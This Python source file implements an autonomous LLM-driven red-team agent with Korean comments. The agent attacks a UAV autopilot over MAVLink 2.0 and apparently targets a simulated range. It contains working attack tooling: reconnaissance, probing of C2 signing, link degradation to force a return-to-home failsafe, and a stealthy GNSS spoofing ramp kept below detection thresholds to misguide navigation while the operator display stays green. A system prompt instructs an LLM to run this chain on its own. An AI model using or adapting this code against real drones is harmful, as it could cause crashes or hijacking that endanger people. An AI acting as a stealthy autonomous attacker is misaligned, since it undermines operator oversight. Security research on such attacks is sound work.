"""
red_agent — LLM-only 자율 공격 에이전트. 표준 MAVLink 2.0 위에서 동작.

설계 결정(잠금):
  - 최종 에이전트는 **LLM-only**. 규칙기반 HeuristicBrain 폴백은 제거됐다. 결정론적
    공방 재현이 필요하면 그것은 에이전트가 아니라 `demo.run_target_scenarios`
    (표적 수용시험)의 몫이다. AI 추론 증거와 결정론적 시험을 섞지 않는다.
  - LLM 이 관측→툴선택→결과평가→중단/적응 루프를 스스로 돈다(수동 에이전트 루프).

그레이박스(필수): 이 에이전트는 공개 규약(mavproto)·중립 수학(common.geo/wire)만 안다.
  방어 정책(common.policy)·서명키·탐지 임계·`true_position`·`mission_compromised`는
  절대 입력으로 받지 않는다. 방어의 존재/강도는 오직 서버 응답(COMMAND_ACK, 텔레메트리)
  으로 경험적으로 추론한다.

두 개의 신뢰영역을 분리해 다룬다(시나리오의 핵심 논지):
  - C2 명령 평면(:14550): MAVLink2 서명 검증을 받을 수 있다. secure 배치에서는 미서명
    프레임(명령·GPS_INPUT)이 링크 경계에서 거부된다.
  - 물리 GNSS RF 신뢰영역(센서 모사 :14600): C2 서명과 **별개**의 물리 신뢰경계.
    전자전 공격자가 작전지역에 방사하는 GNSS 기만 신호를 모사한다. C2 인증과 무관하게
    센서 입력을 오염시킨다.

관측 기반 적응의 정본 흐름:
  probe_c2_auth 로 서명강제를 관측 → 강제되면 C2 경유 주입은 무의미하다고 추론 →
  물리 GNSS RF 신뢰영역(rf_gnss_spoof)으로 전환. 이 전환 판단이 AI 에이전트 증거다.

실행:
  cd src && LLM_API_KEY=gsk_... ../.venv/bin/python -m red_agent.agent
  (키가 없으면 실행하지 않는다 — LLM-only. 키 없는 재현은 demo.run_target_scenarios.)
"""
from __future__ import annotations

import argparse
import json
import os
import sys
import time
from pathlib import Path
from typing import Any, Optional

import httpx

import mavproto  # MAVLINK20 활성 + 공개 규약
from mavproto.dialect import mavlink, ids
from mavproto.link import connect_agent
from common.geo import offset_m
from common.wire import now_ts, Position
from common.llm import make_client, tool_result_message, ToolCall

HOST = os.environ.get("RED_HOST", "127.0.0.1")
PORT = int(os.environ.get("RED_MAV_PORT", "14550"))                    # C2 명령 평면
SENSOR_HOST = os.environ.get("RED_SENSOR_HOST", "127.0.0.1")
SENSOR_PORT = int(os.environ.get("RED_SENSOR_PORT", "14600"))          # 물리 GNSS RF 신뢰영역
CONTROL_URL = os.environ.get("RED_CONTROL_URL", "http://127.0.0.1:8137")
RED_LOG = os.environ.get("RED_LOG", "logs/red_agent.log")
RED_TRACE = os.environ.get("RED_TRACE", "logs/red_trace.jsonl")       # 구조화 trace(§6 증거)
GOAL = ("오퍼레이터 화면·페일세이프는 정상(그린보드)으로 유지한 채, 링크를 흔들어 페일세이프"
        "(RTL)를 유도한 뒤 GNSS 위치추정을 게이트 아래로 조금씩 편이시켜 RTL 항법을 "
        "오유도하라. 명시적 하이재킹 명령·급격한 스푸핑은 피하라.")

SPOOF_STEP_M = 6.0            # 매 주입당 편이 증분(EKF 게이트 12m 아래 = 스텔스)
SPOOF_BEARING = (0.0, -1.0)  # (북,동) 단위벡터: 서쪽으로 끌기
CUSTOM_MODE_RTL = 6          # ArduCopter RTL


def log_step(kind: str, content: str) -> None:
    line = f"[{now_ts()}] {kind}: {content}"
    print(line, flush=True)
    p = Path(RED_LOG)
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("a", encoding="utf-8") as f:
        f.write(line + "\n")


def write_trace(rec: dict) -> None:
    """관측→추론→행동→결과를 구조화 JSONL 로 남긴다(AI 에이전트 증거 아티팩트)."""
    p = Path(RED_TRACE)
    p.parent.mkdir(parents=True, exist_ok=True)
    with p.open("a", encoding="utf-8") as f:
        f.write(json.dumps({"ts": now_ts(), **rec}, ensure_ascii=False) + "\n")


# ─────────────────────────── MAVLink 클라이언트 + 공격 툴 ───────────────────────────
class Tools:
    """공격 액션의 실행부. 두 신뢰영역(C2 :port / 물리 GNSS RF :sensor_port)을 분리한다."""

    def __init__(self, host: str, port: int, sensor_host: str, sensor_port: int, control_url: str):
        # C2 명령 평면: 키 없음 → 미서명(정규 GCS sys/comp 사칭). secure 면 거부된다.
        self.conn = connect_agent(host, port, me=ids.red, secret_key=None)
        self.conn.mav.heartbeat_send(mavlink.MAV_TYPE_GCS, mavlink.MAV_AUTOPILOT_INVALID, 0, 0, 0)
        # 물리 GNSS RF 신뢰영역: 센서 모사 어댑터에 기만 측정을 방사(RF 환경 action).
        self.sensor = connect_agent(sensor_host, sensor_port,
                                    me=ids.sensor_emulator, secret_key=None)
        self.control_url = control_url
        self._latest: dict[str, Any] = {}
        self.cum_n = 0.0
        self.cum_e = 0.0
        self.signing_enforced: Optional[bool] = None   # probe_c2_auth 결과 캐시

    def _pump(self, dur_s: float = 0.4) -> None:
        t0 = time.monotonic()
        while time.monotonic() - t0 < dur_s:
            msg = self.conn.recv_match(blocking=True, timeout=0.2)
            if msg is None:
                continue
            self._latest[msg.get_type()] = msg

    def _reported_pos(self) -> Optional[Position]:
        g = self._latest.get("GLOBAL_POSITION_INT")
        if g is None:
            return None
        return Position(lat=g.lat / 1e7, lon=g.lon / 1e7, alt_m=g.alt / 1000.0)

    # ── 관측 ──
    def recon_scan(self) -> dict:
        """C2 스트림을 수신해 기체·모드·메시지 종류를 파악(정찰)."""
        self._pump(1.2)
        hb = self._latest.get("HEARTBEAT")
        return {"vehicle_seen": hb is not None,
                "vehicle_system": hb.get_srcSystem() if hb else None,
                "custom_mode": hb.custom_mode if hb else None,
                "message_types": sorted(self._latest.keys())}

    def read_telemetry(self) -> dict:
        """현재 보고위치·EKF 분산·모드(in_rtl 포함)를 읽는다. 스푸핑 효과 확인용."""
        self._pump(0.5)
        g = self._latest.get("GLOBAL_POSITION_INT")
        ekf = self._latest.get("EKF_STATUS_REPORT")
        hb = self._latest.get("HEARTBEAT")
        mode = hb.custom_mode if hb else None
        return {"reported_position": ({"lat": g.lat / 1e7, "lon": g.lon / 1e7} if g else None),
                "ekf_pos_horiz_var": (round(ekf.pos_horiz_variance, 3) if ekf else None),
                "custom_mode": mode, "in_rtl": mode == CUSTOM_MODE_RTL,
                "cumulative_spoof_offset_m": {"north": round(self.cum_n, 1),
                                              "east": round(self.cum_e, 1)}}

    def probe_c2_auth(self) -> dict:
        """미서명 명령 1발(무해한 MAV_CMD_REQUEST_MESSAGE)을 C2 로 보내 COMMAND_ACK 로
        서명강제 여부를 추론한다. ACK 미수신/거부 = 서명강제로 해석."""
        req_msg_cmd = mavlink.MAV_CMD_REQUEST_MESSAGE  # 512, 상태변경 아님
        self.conn.mav.command_long_send(ids.vehicle.system, ids.vehicle.component,
                                        req_msg_cmd, 0, 0, 0, 0, 0, 0, 0, 0)
        deadline = time.monotonic() + 2.0
        while time.monotonic() < deadline:
            ack = self.conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=0.4)
            if ack and ack.command == req_msg_cmd:
                accepted = ack.result == mavlink.MAV_RESULT_ACCEPTED
                self.signing_enforced = not accepted
                return {"c2_command_accepted": accepted, "result": int(ack.result),
                        "inferred_signing_enforced": not accepted,
                        "implication": ("C2 경유 미서명 주입은 거부된다 → 물리 GNSS RF 신뢰영역으로 공격 전환 필요"
                                        if not accepted else "C2 미서명 명령이 수용됨(오설정 배치)")}
            self._pump(0.1)
        self.signing_enforced = True
        return {"c2_command_accepted": None, "inferred_signing_enforced": True,
                "note": "ACK 미수신 → 서명강제로 추론",
                "implication": "C2 경유 미서명 주입은 무의미 → rf_gnss_spoof(물리 GNSS RF)로 전환"}

    # ── 환경(RF 링크) ──
    def degrade_link(self, quality: float = 0.1, hold_s: float = 10.0) -> dict:
        """C2 링크 열화(RF 잼) → 페일세이프(RTL) 유도. RF 는 프로토콜 메시지가 아니라
        환경효과이므로 제어평면 경유(정직한 추상화)."""
        try:
            httpx.post(f"{self.control_url}/api/_env/link_degrade",
                       params={"quality": quality, "hold_s": hold_s,
                               "source": "red_agent"}, timeout=3)
            return {"link_degraded": True, "quality": quality, "hold_s": hold_s,
                    "expect": "GCS heartbeat gap → 오토파일럿이 RTL 페일세이프로 전환"}
        except Exception as e:  # noqa: BLE001
            return {"link_degraded": False, "error": str(e)}

    # ── 주입: 두 신뢰영역 분리 ──
    def c2_gps_inject(self, steps: int = 1) -> dict:
        """C2 명령 평면(:14550)으로 GPS_INPUT 을 주입한다. secure(서명강제) C2 에서는
        링크 경계에서 거부되어 효과가 없다 — C2 신뢰영역에 속하는 액션."""
        applied = self._spoof(self.conn, steps)
        return {"channel": "c2_command_plane", "injections": applied,
                "caveat": "secure C2 면 미서명 프레임으로 거부됨(효과는 read_telemetry 로 확인)",
                "cumulative_offset_m": {"north": round(self.cum_n, 1), "east": round(self.cum_e, 1)}}

    def rf_gnss_spoof(self, steps: int = 1) -> dict:
        """물리 GNSS RF 신뢰영역(센서 모사 :14600)에 기만 측정을 방사한다. C2 서명과
        별개의 물리 신뢰경계라 C2 인증과 무관하게 센서 입력을 오염시킨다(스텔스 램프)."""
        applied = self._spoof(self.sensor, steps)
        return {"channel": "physical_gnss_rf", "injections": applied,
                "cumulative_offset_m": {"north": round(self.cum_n, 1), "east": round(self.cum_e, 1)}}

    def _spoof(self, conn, steps: int) -> int:
        """보고위치 근처로 SPOOF_STEP_M 씩 누적 편이한 GPS_INPUT 을 conn 으로 전송."""
        applied = 0
        for _ in range(max(1, steps)):
            self._pump(0.3)
            base = self._reported_pos()
            if base is None:
                continue
            self.cum_n += SPOOF_STEP_M * SPOOF_BEARING[0]
            self.cum_e += SPOOF_STEP_M * SPOOF_BEARING[1]
            inj = offset_m(base, SPOOF_STEP_M * SPOOF_BEARING[0], SPOOF_STEP_M * SPOOF_BEARING[1])
            self._send_gps_input(conn, inj)
            applied += 1
        return applied

    @staticmethod
    def _send_gps_input(conn, p: Position) -> None:
        ignore = (mavlink.GPS_INPUT_IGNORE_FLAG_VEL_HORIZ |
                  mavlink.GPS_INPUT_IGNORE_FLAG_VEL_VERT |
                  mavlink.GPS_INPUT_IGNORE_FLAG_SPEED_ACCURACY |
                  mavlink.GPS_INPUT_IGNORE_FLAG_HORIZONTAL_ACCURACY |
                  mavlink.GPS_INPUT_IGNORE_FLAG_VERTICAL_ACCURACY)
        conn.mav.gps_input_send(
            int(time.time() * 1e6), 0, ignore, 0, 0,
            mavlink.GPS_FIX_TYPE_3D_FIX, int(p.lat * 1e7), int(p.lon * 1e7), p.alt_m,
            0.7, 0.7, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 12, 0)

    def close(self) -> None:
        for c in (self.conn, self.sensor):
            try:
                c.close()
            except Exception:  # noqa: BLE001
                pass


# 모든 툴이 공유하는 필수 인자. 모델이 "왜 이 행동을 택했는지"를 매 스텝 스스로 밝히게
# 강제해, tool_call 에 담긴 실제 추론을 trace(THOUGHT)로 드러낸다. 툴 실행 전 분리된다.
_REASON = {"reason": {"type": "string",
                      "description": "이 행동을 택한 이유를 관측에 근거해 한국어 한 줄로."}}


def _schema(props: dict, required: Optional[list] = None) -> dict:
    return {"type": "object", "properties": {**_REASON, **props},
            "required": ["reason", *(required or [])]}


TOOL_SCHEMAS = [
    {"name": "recon_scan", "description": "C2 MAVLink 스트림을 수신해 기체·모드·메시지 종류를 파악(정찰).",
     "input_schema": _schema({})},
    {"name": "read_telemetry", "description": "현재 보고위치·EKF 분산·모드(in_rtl)와 누적 편이를 읽는다.",
     "input_schema": _schema({})},
    {"name": "probe_c2_auth", "description": "미서명 명령 1발을 C2 로 보내 COMMAND_ACK 로 서명강제 여부를 추론.",
     "input_schema": _schema({})},
    {"name": "degrade_link", "description": "C2 링크를 열화시켜 페일세이프(RTL)를 유도한다(RF 환경효과).",
     "input_schema": _schema({"quality": {"type": "number"}, "hold_s": {"type": "number"}})},
    {"name": "c2_gps_inject", "description": "C2 명령 평면으로 GPS_INPUT 주입. secure C2 면 거부되어 무효.",
     "input_schema": _schema({"steps": {"type": "integer"}})},
    {"name": "rf_gnss_spoof", "description": "물리 GNSS RF 신뢰영역(C2 서명과 별개)에 기만 측정을 방사. steps 회 스텔스 램프.",
     "input_schema": _schema({"steps": {"type": "integer"}})},
    {"name": "conclude", "description": "임무 종료. success 와 요약.",
     "input_schema": _schema({"success": {"type": "boolean"}, "summary": {"type": "string"}},
                             required=["success"])},
]


def run_tool(tools: Tools, name: str, args: dict) -> dict:
    # reason 은 모델의 추론용 메타 인자다. 툴 실행에는 넘기지 않는다.
    args = {k: v for k, v in (args or {}).items() if k != "reason"}
    if name == "conclude":
        return {"done": True, **args}
    fn = getattr(tools, name, None)
    if fn is None or name.startswith("_") or name not in {s["name"] for s in TOOL_SCHEMAS}:
        return {"error": f"unknown tool {name}"}
    try:
        return fn(**args)
    except Exception as e:  # noqa: BLE001
        return {"error": str(e)}


SYSTEM_PROMPT = (
    "너는 UAV 레드팀 자율 공격 에이전트다. 한 번에 툴 하나만 호출하고, 관측을 보고 다음 "
    "행동을 스스로 정한다. 방어 임계값·서명키·실제 위치는 모른다 — 서버 응답(COMMAND_ACK, "
    "텔레메트리)으로 방어를 경험적으로 추론하라.\n"
    "두 신뢰영역을 구분하라: (1) C2 명령 평면은 MAVLink2 서명 검증을 받을 수 있다. "
    "(2) 물리 GNSS RF 신뢰영역은 C2 서명과 별개다. probe_c2_auth 로 서명강제가 확인되면 "
    "C2 경유 주입(c2_gps_inject)은 무의미하므로 rf_gnss_spoof(물리 GNSS RF)로 전환하라.\n"
    "정석 흐름: recon_scan → probe_c2_auth → degrade_link 로 RTL 유도 → read_telemetry 로 "
    "in_rtl 확인 → (서명강제면) rf_gnss_spoof 를 게이트 아래로 여러 번(EKF 분산이 커지지 않게) → "
    "read_telemetry 로 누적 편이 확인 → conclude. 급격한 스푸핑·명시적 하이재킹 명령은 피하라.\n"
    "모든 툴 호출에는 reason 인자를 반드시 채워, 방금 관측한 무엇 때문에 이 행동을 택했는지 "
    "한 줄로 밝혀라(예: '서명강제가 확인되어 C2 대신 물리 GNSS RF 로 전환')."
)


# ─────────────────────────── LLM 브레인 (provider-agnostic, 유일한 브레인) ───────────────────────────
class LLMBrain:
    """LLM(OpenAI 호환 tool use)이 tool_calls 로 다음 행동을 스스로 결정하는 수동 에이전트 루프."""

    def __init__(self, client):
        self.client = client
        self.messages: list[dict] = [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content":
                f"목표: {GOAL}\n표적 C2 는 {HOST}:{PORT}, 물리 GNSS RF 신뢰영역은 "
                f"{SENSOR_HOST}:{SENSOR_PORT} 의 UAV 오토파일럿(MAVLink 2.0)이다. "
                "정찰부터 시작하라."}]
        self._pending: Optional[ToolCall] = None

    def decide(self, last_obs: Optional[dict]) -> tuple[str, str, dict]:
        if last_obs is not None and self._pending is not None:
            self.messages.append(tool_result_message(self._pending, last_obs))
        result = self.client.complete(self.messages, TOOL_SCHEMAS)
        # 다중 tool_call 방지: 첫 호출만 실행·이력화(OpenAI 는 미응답 tool_call 을 다음 턴에 요구).
        if result.tool_calls:
            first = result.tool_calls[0]
            am = dict(result.assistant_message)
            if "tool_calls" in am:
                am["tool_calls"] = am["tool_calls"][:1]
            self.messages.append(am)
            self._pending = first
            # 추론 우선순위: 모델 content > tool_call 의 reason 인자 > 최후 라벨.
            reason = (first.arguments or {}).get("reason")
            thought = (result.text or "").strip() or reason or f"{first.name} 실행"
            return (thought, first.name, first.arguments)
        self.messages.append(result.assistant_message or {"role": "assistant", "content": result.text})
        return (result.text or "종료.", "conclude", {"success": True, "summary": result.text})


# ─────────────────────────── 에이전트 루프 ───────────────────────────
def run(max_steps: int = 24) -> int:
    client = make_client()
    if client is None:
        msg = ("LLM 키가 없다. red_agent 는 LLM-only 다(설계 결정: 결정론적 폴백 제거). "
               "LLM_API_KEY 를 설정해 실행하거나, 키 없는 재현은 `python -m demo.run_target_scenarios` "
               "(표적 수용시험, 에이전트 아님)를 사용하라.")
        log_step("ABORT", msg)
        return 2

    brain = LLMBrain(client)
    tools = Tools(HOST, PORT, SENSOR_HOST, SENSOR_PORT, CONTROL_URL)
    log_step("START", f"c2={HOST}:{PORT} gnss_rf={SENSOR_HOST}:{SENSOR_PORT} brain=llm goal={GOAL}")
    write_trace({"event": "start", "goal": GOAL,
                 "c2": f"{HOST}:{PORT}", "gnss_rf": f"{SENSOR_HOST}:{SENSOR_PORT}"})
    try:
        return _run_loop(brain, tools, max_steps=max_steps, step_delay=0.3)
    finally:
        tools.close()


def _run_loop(brain, tools, *, max_steps: int = 24, step_delay: float = 0.3,
              trace: bool = True) -> int:
    """관측→추론→행동→결과 루프. brain/tools 를 주입받아 테스트 가능하게 분리했다.

    반환된 action 목록·관측이 다음 decide 로 되먹임되는지가 이 루프의 계약이다
    (관측 기반 적응은 brain 이 그 되먹임을 읽고 판단하는 데서 나온다)."""
    last_obs: Optional[dict] = None
    for i in range(max_steps):
        thought, action, args = brain.decide(last_obs)
        log_step("THOUGHT", thought)
        log_step("ACTION", f"{action} {json.dumps(args, ensure_ascii=False)}")
        obs = run_tool(tools, action, args)
        last_obs = obs
        log_step("OBSERVATION", json.dumps(obs, ensure_ascii=False))
        if trace:
            write_trace({"event": "step", "i": i, "thought": thought,
                         "action": action, "args": args, "observation": obs})
        if action == "conclude" or obs.get("done"):
            log_step("END", f"success={obs.get('success')}")
            if trace:
                write_trace({"event": "end", "success": obs.get("success"),
                             "summary": obs.get("summary")})
            return 0
        if step_delay:
            time.sleep(step_delay)
    log_step("END", "max_steps 도달")
    if trace:
        write_trace({"event": "end", "success": None, "summary": "max_steps"})
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="LLM-only 자율 공격 에이전트")
    ap.add_argument("--max-steps", type=int, default=24)
    args = ap.parse_args()
    sys.exit(run(max_steps=args.max_steps))
